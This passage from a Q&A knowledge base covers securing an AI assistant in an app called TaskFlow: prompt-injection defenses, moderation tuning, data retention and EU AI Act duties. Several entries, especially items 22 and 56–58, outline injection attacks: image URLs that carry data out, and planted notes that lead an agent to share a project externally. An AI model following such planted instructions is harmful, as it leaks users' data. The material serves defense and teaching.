docs.text: The pending action is stored on the server with its exact arguments, user, and expiry; the UI shows the exact rendered action, not a summary; approval comes from a UI control that calls the API, never from chat text; it works once, for the same user, before expiry; and authorization is re-checked at execution. Confirm only consequential actions, or users stop reading.

docs.title: 20. Why add a CSP img-src allowlist if you already filter Markdown?
docs.text: Filters are regular expressions or renderer hooks, and Markdown has many syntaxes; a missed form is likely sooner or later. The browser enforces CSP for every image load, so an image the filter missed is still not fetched, and report-to sends a violation report that tells you the filter has a gap.

docs.title: 21. How do you test prompt-injection defenses?
docs.text: Unit-test the deterministic layers (filters, gates, confirmation store). Keep adversarial evaluation cases that plant payloads in notes, emails, and documents and assert that a canary value never appears in URLs, links, or tool arguments, and run them in CI. Use red-team tools such as garak, promptfoo, or PyRIT, and test against adaptive attackers who know the defense: adaptive attacks defeated most of 12 published defenses in a 2025 study.

docs.title: 22. Why are MCP tool descriptions an injection risk?
docs.text: Tool names, descriptions, and schemas are text the model reads when it decides what to call. A malicious or compromised server can put instructions there, and a pinned version does not help if the description changes without a version bump. Review and pin servers, audit descriptions, and give each feature only the tools it needs.

docs.title: 23. What is a guardrail, and where can it run?
docs.text: A check before or after a model call that can allow, change, or stop content. NeMo Guardrails names five places: input rails, dialog rails, retrieval rails (on retrieved chunks), execution rails (on tool inputs and outputs), and output rails. Most apps need cheap deterministic checks, input classifiers, and output checks.

docs.title: 24. How is content moderation different from prompt-injection defense?
docs.text: Moderation classifies content against harm categories such as harassment, hate, sexual content, violence, and self-harm. It does not detect an attack on your application's goals or stop data exfiltration. A polite, harmless-looking injection passes moderation easily.

docs.title: 25. What does the OpenAI moderation endpoint return, and how should you use it?
docs.text: For each input it returns flagged, per-category booleans in categories, confidence scores in category_scores, and which input types each score applies to. OpenAI advises treating scores "as signals for your application's policy, not as an automatic blocking decision", and warns that thresholds may need recalibration as the model is upgraded. Map scores through your own policy.

docs.title: 26. Compare the main kinds of moderation checks.
docs.text: Rules and blocklists are fast but brittle. Hosted moderation APIs give calibrated scores but a fixed taxonomy. Configurable services (Bedrock Guardrails, Foundry guardrails, Model Armor) add denied topics, PII masking, and grounding checks. Open-weight classifiers (Llama Guard 4, ShieldGemma, Granite Guardian) run in your network. Policy-reasoning models such as gpt-oss-safeguard apply your written policy but are slower and costlier per call.

docs.title: 27. What belongs in a content policy?
docs.text: For each category: what counts as a violation in this product, boundary examples, the surfaces it applies to (input, output, shared comments), the action, and who reviews. Keep it as versioned data and record the policy version with every decision. A workplace tool's policy differs from a fiction app's.

docs.title: 28. Why give a supportive reply to self-harm intent instead of blocking?
docs.text: A person who discloses intent to self-harm needs help, not an error message. The policy maps self-harm intent to a fixed, reviewed message with support resources chosen by locale, while self-harm instructions in model output are blocked.

docs.title: 29. Why do false positives dominate when violations are rare?
docs.text:
Because of the base rate. With 50 violations in 10,000 comments, 96% recall, and a 1% false-positive rate on benign text:

true positives  = 0.96 x 50    = 48
false positives = 0.01 x 9,950 = about 100
precision       = 48 / 148     = 0.32

Two of three flags are wrong although the classifier is "99% accurate" on benign text.

docs.title: 30. How do you choose a moderation threshold?
docs.text: Collect labeled examples per category (from review queues and red-team cases), sweep thresholds, and compute precision, recall, and flag rate. Pick the highest threshold that meets the recall target the policy sets for that category, which keeps false positives and review workload lowest. Repeat per language.

docs.title: 31. Why can a threshold that worked last quarter start over-blocking?
docs.text: The provider upgraded the classifier behind an alias and score distributions shifted, your traffic changed (a new industry or language), or attackers adapted. Pin model snapshots where offered, alert on shifts in score percentiles, and re-run the sweep on the labeled set.

docs.title: 32. How do you keep moderation from adding latency?
docs.text: Run the input check in parallel with the model call and abort the model if the input is flagged; buffer streamed output into sentences and check each before showing it; cache verdicts by a hash of the normalized text and the policy version; and run cheap deterministic checks first.

docs.title: 33. What do fail open and fail closed mean for a guardrail?
docs.text: When a check times out or errors, fail closed blocks or holds the content; fail open continues and logs. Fail closed where a miss is costly (public comments, content for children), fail open where availability matters more and the harm of a miss is low. Make the choice explicit per feature.

docs.title: 34. Why set maxRetries: 0 on a moderation call made inside a guard?
docs.text: The guard owns the deadline. SDK retries with backoff would stretch a 1.5-second budget into several seconds without anyone noticing, and the timeout decision (open or closed) would no longer reflect the policy.

docs.title: 35. Which guardrail libraries are maintained, as of November 2026?
docs.text: NVIDIA NeMo Guardrails (version 0.24.1, repository moved to the NVIDIA-NeMo organization) and Guardrails AI (version 0.11.0) are active. LLM Guard was archived on July 9, 2026 and is read-only, so new projects should not start on it. In TypeScript, AI SDK middleware (wrapLanguageModel) can wrap checks around any provider's model.

docs.title: 36. What are Gemini's default safety settings on current models?
docs.text: Google's documentation says the default threshold for the adjustable categories is "Off for Gemini 2.5 and later models", while core harms such as child safety are always blocked and cannot be adjusted. Teams that assumed filters were on need their own moderation.

docs.title: 37. Where do copies of one AI request end up?
docs.text: At the provider: abuse-monitoring logs, stored state (responses, files, vector stores, conversations), and prompt caches. In your systems: app logs, traces, answer caches, vector store chunks, and evaluation and feedback sets. Each needs an owner, a lifetime, and a deletion path.

docs.title: 38. What is the difference between minimization, masking, and pseudonymization?
docs.text: Minimization sends only the fields a feature needs. Masking replaces a value with a type marker such as [EMAIL]. Pseudonymization replaces it with a numbered placeholder such as [EMAIL_1] that your server can map back, so the model can tell people apart and the output can be restored for allowed types.

docs.title: 39. How does a redactor avoid false positives on card numbers and IBANs?
docs.text: By validating checksums before replacing: card numbers carry a Luhn check digit and IBANs a mod-97 checksum. A 16-digit invoice number that fails Luhn stays as it is. Detector order matters too: secrets and emails run before patterns that could match parts of them.

docs.title: 40. Why does the redactor neutralize text that looks like a placeholder?
docs.text: If a user types [EMAIL_1], a naive restore would swap in the real value. Rewriting such text to (EMAIL_1) before redaction means only placeholders the redactor created can be restored.

docs.title: 41. Is pseudonymized data still personal data under the GDPR?
docs.text: Yes. Recital 26 treats pseudonymized data as personal data while someone holds the additional information that maps it back. Pseudonymization keeps placeholders out of the provider, logs, and traces, but it does not take the feature out of scope.

docs.title: 42. What does OpenAI keep for API calls by default?
docs.text: API data is not used for training unless you opt in. Abuse-monitoring logs are kept for up to 30 days. Responses API outputs are stored for at least 30 days unless store: false, and files, vector stores, and conversations are kept until you delete them. Zero Data Retention and Modified Abuse Monitoring need prior approval.

docs.title: 43. What does zero data retention not cover?
docs.text: Stateful features (files, vector stores, batches, conversations, code execution containers) keep data until deleted; content flagged for abuse can be kept longer (Anthropic says up to two years); some models are excluded (Anthropic lists models that require 30-day retention, and Bedrock models that require aws_review are unavailable in none mode); and caches may hold data briefly.

docs.title: 44. How do the Gemini API's unpaid and paid tiers differ on data use?
docs.text: Under the Gemini API terms, unpaid services may use content to improve products and human reviewers may read it, so they are not for personal or confidential data. Paid services do not use prompts or responses to improve products, but log them for a limited period for abuse detection. Apps for users in the EEA, Switzerland, or the UK must use paid services.

docs.title: 45. How do you keep prompts out of logs and traces?
docs.text:
Log metadata (request id, feature, model, tokens, latency, guardrail decision, provider response id, a keyed-hash user pseudonym), not text. Under the OpenTelemetry GenAI conventions, content capture is opt-in; set it off explicitly:

OTEL_INSTRUMENTATION_GENAI_CAPTURE_CONTENT=NO_CONTENT

For debugging, use a separate, access-controlled, short-lived content store referenced from traces.

docs.title: 46. How do you erase one user's AI data?
docs.text: Run an idempotent job: delete source data, then derived data (vector chunks by source id, cached answers, evaluation and feedback rows), then provider objects through the API using an index recorded at creation time (treat 404 as done, retry failures), and let TTL copies expire. Backups need deletions re-applied on restore, and fine-tuned weights cannot forget one person, so keep personal data out of training sets.

docs.title: 47. What does data residency involve beyond choosing a provider region?
docs.text: Separating storage from processing: OpenAI offers ten storage regions but in-region processing only in some, chosen per project with a regional base URL; Azure's deployment type (standard, DataZone, Global) decides where processing happens; Bedrock's cross-region inference moves it. Your own vector store, logs, and backups must be in the right region too.

docs.title: 48. What is the difference between a provider and a deployer under the EU AI Act?
docs.text: A provider develops an AI system or model and places it on the market under its own name; a deployer uses an AI system under its authority in a professional activity. TaskFlow is a provider of the Assistant, built on a general-purpose model from another provider; companies that roll the Assistant out to staff are deployers.

docs.title: 49. What are the AI Act's risk tiers? Give a TaskFlow example of each.
docs.text: Prohibited (Article 5): inferring workers' emotions from meeting notes. High-risk (Article 6, Annexes I and III): suggesting who gets a task from past performance (Annex III point 4(b)). Transparency (Article 50): the Assistant chat must say it is an AI. Minimal: a spam filter for comments. General-purpose AI models have a separate track.

docs.title: 50. What did the 2026 Digital Omnibus on AI change?
docs.text: It entered into force on July 27, 2026. It moved the Annex III high-risk obligations, due on August 2, 2026, to December 2, 2027, and set August 2, 2028 for AI in regulated products (Annex I). It added bans on non-consensual intimate imagery and CSAM from December 2, 2026, and softened the AI literacy duty to "take measures to support" staff literacy. The Article 50 transparency duties still apply from August 2, 2026, except that generative systems already on the market have until December 2, 2026 to mark their output.

docs.title: 51. What does Article 50 require of a chat assistant?
docs.text: People must be "informed that they are interacting with an AI system", clearly and at the latest at the first interaction, unless it is obvious. Providers of systems that generate synthetic content must also mark it in a machine-readable, detectable way, with exceptions for assistive editing. Carry an AI flag in API responses so every client shows the label.

docs.title: 52. What is the maximum AI Act fine for a prohibited practice?
docs.text: EUR 35 million or 7% of worldwide annual turnover, whichever is higher. For a company with EUR 2 billion turnover, 7% is EUR 140 million, so the cap is EUR 140 million. For an SME the lower figure applies: with EUR 10 million turnover, 7% is EUR 0.7 million.

docs.title: 53. How do the NIST AI RMF and ISO/IEC 42001 differ?
docs.text: The NIST AI RMF is a voluntary framework organized into Govern, Map, Measure, and Manage, with a Generative AI Profile (NIST AI 600-1); NIST says it is being revised. ISO/IEC 42001:2023 specifies requirements for an AI management system that organizations can be certified against, which enterprise customers may ask for.

docs.title: 54. What is a system card, and which fields matter most?
docs.text: A short, structured document per AI feature: purpose, intended users, uses it must not be put to, risk tier, model configuration key, data and retention, evaluation evidence, human oversight, limitations, and an incident contact. The "not intended for" list and dated evaluation evidence matter most; keep cards as data and check them in CI.

docs.title: 55. Which US state laws discussed here matter to an app like TaskFlow?
docs.text: Colorado's SB26-189 (signed May 14, 2026) replaced the 2024 Colorado AI Act with rules for automated decision-making used in consequential decisions such as employment, with duties phasing in from January 1, 2027; it may apply if features influence employment decisions about Colorado residents. California's SB 53 targets frontier model developers, not application builders.

docs.title: 56. Meeting summaries in one workspace suddenly contain "[image removed]". What do you do?
docs.text:
What to check first: the output filter's image_removed findings by workspace, and the note ids cited in the affected summaries.

How to confirm: open the traces for those requests and look for the same note in the retrieved context; scan it for injection signals and invisible characters.

Likely causes and fixes: a planted note asking the model to add an image whose URL carries data. Quarantine the note, notify the workspace owner, search for the payload elsewhere, and add it to the adversarial test set. See prompt injection and defenses.

docs.title: 57. CSP violation reports for img-src spike on the Assistant page. What is going on?
docs.text:
What to check first: the blockedURL hosts in the reports and the model outputs at those times.

How to confirm: replay the logged outputs through the Markdown filter and the renderer, and compare what each treats as an image.

Likely causes and fixes: an exfiltration attempt using a Markdown form the filter misses. The CSP blocked it; extend the filter and its tests, and keep the allowlist tight. See prompt injection and defenses.

docs.title: 58. The task agent proposes sharing a project with an outside address right after reading notes. What do you do?
docs.text:
What to check first: the tool-call trace, the notes read before the proposal, and the session's capability set.

How to confirm: look for instructions in the retrieved notes, and check that the Rule of Two gate turned the call into a pending confirmation rather than running it.

Likely causes and fixes: indirect injection through a shared note. Keep the confirmation, remove tools the feature does not need, and move the flow to plan-then-execute or a Dual LLM design. See prompt injection and defenses.

docs.title: 59. The injection classifier keeps blocking a security team's notes. How do you fix it?
docs.text:
What to check first: the block rate per workspace and the appeal outcomes.

How to confirm: label a sample of blocked notes; if most discuss attacks rather than contain them, they are false positives.

Likely causes and fixes: a detector threshold tuned on generic data applied to content about prompts. Log and review instead of blocking for low-risk features, tune on your own labels, and keep the architectural controls as the boundary. See guardrails and content moderation.

docs.title: 60. The moderation block rate doubles overnight with no deploy. What do you check?
docs.text:
What to check first: score percentiles per category over time, and the moderation model reported in responses.

How to confirm: re-score a fixed labeled set and compare with last month's results.

Likely causes and fixes: the provider upgraded the model behind an alias. Pin a snapshot where offered, re-run the threshold sweep, and alert on distribution shifts. See guardrails and content moderation.

docs.title: 61. Assistant p95 latency grows by a second. Traces show the output moderation span waiting. What now?
docs.text:
What to check first: the moderation span durations, error codes, and retry counts.

How to confirm: check whether spans end at the guard's deadline and whether SDK retries happen inside the deadline.

Likely causes and fixes: a slow moderation region amplified by retries. Set maxRetries: 0 inside the guard, keep a tight deadline, choose fail open or closed per feature, and cache verdicts. See guardrails and content moderation.

docs.title: 62. Users report seeing harmful text appear and then disappear. Why?
docs.text:
What to check first: whether the endpoint streams tokens to the browser before the output check runs.

How to confirm: reproduce with a known-flagged prompt and record the stream.

Likely causes and fixes: retracting content after streaming it. Buffer output into sentences and release each one only after it passes the check. See guardrails and content moderation.

docs.title: 63. A customer's security review finds full prompts in your log platform. What do you do?
docs.text:
What to check first: which service and log line write them, and whether tracing content capture is on in any environment.

How to confirm: search logs for a known test email, and inspect the OTEL_INSTRUMENTATION_GENAI_CAPTURE_CONTENT value per environment.

Likely causes and fixes: a debug log in the AI client wrapper or content capture enabled by a copied configuration. Remove it, set NO_CONTENT explicitly, purge affected indexes, and add a CI check. See privacy, PII, and data retention.

docs.title: 64. A user was erased, but project Q&A still cites one of their notes. What went wrong?
docs.text:
What to check first: the vector store for chunks with the deleted note's source id, and the answer cache.

How to confirm: query the vector index directly by source id and check cache keys for the user.

Likely causes and fixes: the erasure job deleted the note but not its derived copies. Delete chunks by source id and cache entries by user in the job, and add a test that searches for erased content. See privacy, PII, and data retention.

docs.title: 65. A user pasted an API key into a meeting note that was summarized. What do you do?
docs.text:
What to check first: whether the redactor's SECRET count was non-zero for that request, and which provider calls included the note.

How to confirm: check the provider response ids in your logs and whether the key pattern was replaced before sending.

Likely causes and fixes: treat the key as leaked: revoke and rotate it at once. Keep secret patterns in the redactor in front of every model call and warn users when a note contains a credential. See privacy, PII, and data retention.

docs.title: 66. After switching to zero data retention, file uploads and stored conversations fail. Why?
docs.text:
What to check first: which endpoints fail, and the provider's eligibility table for zero retention.

How to confirm: check whether the failing calls use stateful features or store: true.

Likely causes and fixes: stateful features are not covered by zero retention (on Bedrock, store=true is rejected in none mode). Keep state in your own database, pass context explicitly, and set store: false. See privacy, PII, and data retention.

docs.title: 67. Users see placeholders such as "[EMAIL_2]" in summaries. How do you fix it?
docs.text:
What to check first: whether the restore step used the same vault as the redaction, and which types were allowed.

How to confirm: log placeholder counts per request and compare the placeholders in the model output with the vault's keys.

Likely causes and fixes: a new vault per note, or the model altering or inventing placeholders. Use one vault per request, instruct the model to copy placeholders exactly, and render unknown placeholders as "(hidden)". See privacy, PII, and data retention.

docs.title: 68. The weekly governance job fails on a new "workload insights" card. What does it mean?
docs.text:
What to check first: the checker's messages: risk tier, missing fields, and evidence age.

How to confirm: read the card's purpose; suggesting who gets a task from past performance matches Annex III point 4(b).

Likely causes and fixes: a high-risk feature heading for launch without oversight, limitations, or fresh evaluations. Stop the launch, get legal review, and either plan for the high-risk regime or redesign the feature. See AI regulation and governance.

docs.title: 69. A customer exports workload suggestions into performance reviews. Why is that a problem?
docs.text:
What to check first: the feature's system card and its "not intended for" list, and how the export is used.

How to confirm: review support requests and usage analytics for the export path.

Likely causes and fixes: the feature drifted into evaluating workers, a high-risk use in the EU and a consequential decision under Colorado's law. Re-classify, restrict the export, update terms and the card, and get legal advice. See AI regulation and governance.
